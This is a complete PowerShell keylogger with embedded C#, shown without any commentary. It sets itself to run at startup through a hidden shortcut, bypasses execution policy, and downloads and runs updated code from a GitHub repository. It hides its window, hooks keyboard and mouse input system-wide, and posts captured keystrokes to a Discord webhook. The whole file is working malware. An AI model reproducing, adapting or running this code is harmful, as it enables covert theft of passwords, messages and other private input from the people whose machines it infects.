$u="https://discord.com/api/webhooks/1363942155105865909/xfuFLDF6gBZ62O9ij5vh-FH4BnCqdl5lZLCYvmqvwsmH7fcHh34kqFxmhigqiWVUyBiT"
$r="https://raw.githubusercontent.com/UnsavorySpirit/F0_KeyLogger/main/k_min.ps1"
$s=$MyInvocation.MyCommand.Definition
$f=[Environment]::GetFolderPath("Startup")
$l=Join-Path $f "k.lnk"
if(-not(Test-Path $l)){ $w=New-Object -ComObject WScript.Shell;$c=$w.CreateShortcut($l);$c.TargetPath="powershell.exe";$c.Arguments="-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$s`"";$c.WorkingDirectory=(Split-Path $s);$c.Save() }

function U{try{$x=Invoke-WebRequest -Uri $r -UseBasicParsing;if($x.Content -ne (Get-Content $s -Raw)){ $x.Content | Set-Content $s -Force;Start-Process "powershell" "-w hidden -ep bypass -f `"$s`"";exit }}catch{}}
U

Add-Type -TypeDefinition @"using System;using System.Runtime.InteropServices;public class W{[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);public const int H=0;}"@
[W]::ShowWindow([W]::GetConsoleWindow(),[W]::H)

Add-Type -ReferencedAssemblies "System.Windows.Forms.dll" -TypeDefinition @"
using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Text;using System.Windows.Forms;
public class G{const int K=13,M=14,D=0x100,L=0x201;delegate IntPtr P(int a,IntPtr b,IntPtr c);static P kp=Kc,mp=Mc;
static IntPtr kh=IntPtr.Zero,mh=IntPtr.Zero;static StringBuilder b=new StringBuilder(100);public static Action<string> C;
[DllImport("user32.dll")]static extern IntPtr SetWindowsHookEx(int a,P d,IntPtr h,uint t);
[DllImport("user32.dll")]static extern bool UnhookWindowsHookEx(IntPtr h);
[DllImport("user32.dll")]static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);
[DllImport("kernel32.dll")]static extern IntPtr GetModuleHandle(string n);
[DllImport("user32.dll")]static extern bool GetKeyboardState(byte[] k);
[DllImport("user32.dll")]static extern int ToUnicode(uint vk,uint s,byte[] k,[Out,MarshalAs(UnmanagedType.LPWStr)] StringBuilder o,int l,uint f);
[DllImport("user32.dll")]static extern uint MapVirtualKey(uint c,uint t);
public static void Start(){using(Process p=Process.GetCurrentProcess())using(ProcessModule m=p.MainModule){IntPtr h=GetModuleHandle(m.ModuleName);
kh=SetWindowsHookEx(K,kp,h,0);mh=SetWindowsHookEx(M,mp,h,0);}}
public static void Stop(){UnhookWindowsHookEx(kh);UnhookWindowsHookEx(mh);}
static IntPtr Kc(int n,IntPtr w,IntPtr l){if(n>=0&&w==(IntPtr)D){int vk=Marshal.ReadInt32(l);byte[] s=new byte[256];
GetKeyboardState(s);uint scan=MapVirtualKey((uint)vk,0);StringBuilder sb=new StringBuilder(2);
int len=ToUnicode((uint)vk,scan,s,sb,sb.Capacity,0);char c=len>0?sb[0]:'\0';
if(c!='\0')b.Append(c);else if(vk==(int)Keys.Space||vk==(int)Keys.Enter){b.Append(vk==(int)Keys.Space?' ':'\n');F();}
if(vk==(int)Keys.Escape){Stop();Application.Exit();}}return CallNextHookEx(kh,n,w,l);}
static IntPtr Mc(int n,IntPtr w,IntPtr l){if(n>=0&&w==(IntPtr)L){F();}return CallNextHookEx(mh,n,w,l);}
static void F(){if(b.Length>0&&C!=null){C(b.ToString());b.Clear();}}
}
"@
[G]::C=[Action[string]]{param($m)try{irm -Uri $u -Method Post -Body (@{content=$m}|ConvertTo-Json) -ContentType 'application/json'}catch{}}
[G]::Start()
[System.Windows.Forms.Application]::Run()
